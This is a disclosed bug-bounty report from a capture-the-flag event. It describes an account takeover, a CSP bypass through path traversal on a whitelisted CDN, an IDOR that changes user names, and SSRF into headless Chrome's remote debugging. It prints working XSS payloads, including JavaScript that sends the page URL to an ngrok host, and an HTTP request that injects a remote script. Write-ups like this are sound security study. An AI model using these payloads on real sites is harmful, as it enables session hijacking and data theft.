# [h1-415 2020] SSRF in a headless chrome with remote debugging leads to sensible information leak

## Report Details
- **Report ID**: 781295
- **URL**: https://hackerone.com/reports/781295
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-01-23T06:37:43.199Z
- **Disclosed**: 2020-02-04T07:17:43.082Z

## Reporter
- **Username**: d1r3wolf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
## Summary:
Converter is using headless chrome with remote debbuging by rendring a page where we have out name, with which we can get xss leads to ssrf
By using the remote debbugging with that ssrf we can grab the info all tabs in that chrome wher we can get even the flag document.

## Steps To Reproduce:

  1. Using QR code generator (at recovery to) to take over account (jobert@mydocz.cosmic)
  2. Using xss in support by bypassing the csp using the github account , simple by backtracking in the url
  3. At the suport review, there is a idor we can change anyones name , with out character stripping (<>{}) . so we can change our name to tigger xss in pdf converter
  4. in the pdf convertor, ssrf to access the remote debbugging to leak the info

## Breif
 1. Using QR code generator (at recovery to) to take over account (jobert@mydocz.cosmic)

    While return a QR after registering it is stripping the <> chars , which help's to create recovery qr for anyones account.
we cant create a account with jobert@mydocz.cosmic mail
but we can create account with jobert@mydocz.cosmic<><> mail
after creates it returns the recover code by stripping <> means recovery code of jobert@mydocz.cosmic

 2. Using xss in support by bypassing the csp using the github account , simple by backtracking in the url
     
     After getting jobert's account we can enter the support channel, where if we gave rating 1 , our chat we be reviewed. we have xss in messages but we need to bypass the csp.
```Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *```
csp is allowing the script from https://raw.githack.com/mattboldt/typed.js/master/lib/, here  we can backtrack any url upto its root(/) and github is a open source.
So we can include js file in our github account using backtracking,. csp bypassed : )
The message
```html
<script type="text/javascript" src="https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fAjay-Aj-00/Test/master/final.js"></script>
```
js file : 
```js
window.location = "https://8a7b2695.ngrok.io/record-data?name=path&data="+btoa(window.location.href)
```
as that support review link does need any login or localhost . so we can access it from outside. so grabbing that link.


 3. At the suport review, there is a idor we can change anyones name , with out character stripping (<>{}) . so we can change our name to tigger xss in pdf converter
   Support provies updating the user along with reviewsing chat
   There is idor at updating user's name (with out sanitizing <> chars) which is used at convertor
```
POST /support/review/efe74fb38a69eae74f733a3e035edf33ed14f34af0755495ff6abae219155587 HTTP/1.1
Host: h1-415.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://h1-415.h1ctf.com/support/review/88cdddff2719525210a5cdc95f3cf7f14c83f6e44caf87f5ec4255a9f69e35eb
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Origin: https://h1-415.h1ctf.com
Connection: close
Cookie: _csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee; session=eyJfY3NyZl90b2tlbiI6IjQ2Y2I4YTYyYzNjOTliNWQ1YTJjMDQ1YmFlY2Y5MDM5MjE2YTNjZWUifQ.Xikx5g.KDxEtKJxN1cDleoMbr6adoqpgCs
Upgrade-Insecure-Requests: 1
.
name=<script src="https://8a7b2695.ngrok.io/static/js/new.js"></script>&user_id=18&_csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee
```

## Impact

Leaking sensitive information ofusers.

## Attachments
- flag.pdf
